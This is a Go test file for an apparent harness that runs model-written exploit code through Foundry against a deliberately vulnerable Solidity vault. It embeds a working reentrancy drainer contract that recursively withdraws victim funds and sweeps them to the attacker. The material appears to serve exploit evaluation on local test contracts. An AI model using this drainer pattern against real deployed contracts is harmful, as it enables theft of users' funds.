package runner

import (
	"context"
	"os"
	"os/exec"
	"testing"
	"time"
)

// These tests run REAL forge against a REAL forge project. They are skipped
// automatically if forge isn't installed or SENTINELX_PROJECT isn't set,
// so `go test ./...` stays green in environments without forge; set
// SENTINELX_PROJECT=/path/to/forge/project (with src/VulnerableVault.sol)
// and SENTINELX_SOLC=/path/to/solc to exercise them.

func liveProject(t *testing.T) (dir, solc string) {
	t.Helper()
	base := os.Getenv("SENTINELX_PROJECT")
	if base == "" {
		t.Skip("set SENTINELX_PROJECT to run live forge tests")
	}
	if _, err := exec.LookPath("forge"); err != nil {
		t.Skip("forge not on PATH")
	}
	return freshForgeProject(t, base), os.Getenv("SENTINELX_SOLC")
}

// localDeployVaultConfig builds a Config that deploys VulnerableVault, seeds
// it with 10 ETH of victim funds, and asserts the attacker profited.
func localDeployVaultConfig() Config {
	return Config{
		Mode:       ModeLocalDeploy,
		Imports:    `import "../src/VulnerableVault.sol";`,
		TargetDecl: `VulnerableVault internal target;`,
		TargetSetup: `target = new VulnerableVault();
        vm.deal(address(0xBEEF), 10 ether);
        vm.prank(address(0xBEEF));
        target.deposit{value: 10 ether}();`,
		StartBalanceWei:  "1 ether",
		SuccessAssertion: `assertGt(attacker.balance, preAttackerBalance, "no profit");`,
	}
}

const honestReentrancyModelCode = `    function attack() internal {
        Drainer d = new Drainer(target);
        (bool ok, ) = address(d).call{value: START_BALANCE}("");
        require(ok, "fund failed");
        d.run();
        d.sweep();
    }
}

contract Drainer {
    VulnerableVault public target;
    bool internal attacking;
    uint8 internal depth;
    constructor(VulnerableVault _t) { target = _t; }
    function run() external {
        attacking = true;
        target.deposit{value: address(this).balance}();
        target.withdraw();
        attacking = false;
    }
    function sweep() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }
    receive() external payable {
        if (attacking && depth < 5 && address(target).balance >= 1 ether) {
            depth++;
            target.withdraw();
        }
    }`

func TestForgeRunner_HonestExploitCompilesRunsPasses(t *testing.T) {
	dir, solc := liveProject(t)
	r := NewForgeRunner(dir, localDeployVaultConfig(), LocalBackend{})
	r.SolcPath = solc
	r.Timeout = 60 * time.Second

	res := r.Run(context.Background(), honestReentrancyModelCode)
	if res.InfraErr != nil {
		t.Fatalf("infra error: %v", res.InfraErr)
	}
	if !res.Compiled {
		t.Fatalf("expected compile success, got:\n%s", res.CompileErr)
	}
	if !res.ForgePassed {
		t.Fatalf("expected forge PASS, reason=%q\n%s", res.ForgeReason, res.RawOutput)
	}
	if res.TestRun == nil || len(res.TestRun.Arena("Execution")) == 0 {
		t.Fatal("expected a populated Execution arena")
	}
	if res.TargetAddress == "" {
		t.Fatal("expected resolved target address from Setup CREATE")
	}
	if res.AttackerEOA == "" {
		t.Fatal("expected attacker EOA from startPrank calldata")
	}
	t.Logf("target=%s attacker=%s", res.TargetAddress, res.AttackerEOA)
}

func TestForgeRunner_CompileErrorIsNotInfraError(t *testing.T) {
	dir, solc := liveProject(t)
	r := NewForgeRunner(dir, localDeployVaultConfig(), LocalBackend{})
	r.SolcPath = solc
	r.Timeout = 60 * time.Second

	// Deliberately broken model code (missing closing brace / undefined ref).
	res := r.Run(context.Background(), `    function attack() internal { this_is_not_valid_solidity(); `)
	if res.InfraErr != nil {
		t.Fatalf("a compile error must NOT surface as infra error: %v", res.InfraErr)
	}
	if res.Compiled {
		t.Fatal("expected Compiled=false for broken code")
	}
	if res.CompileErr == "" {
		t.Fatal("expected compiler diagnostics captured")
	}
}
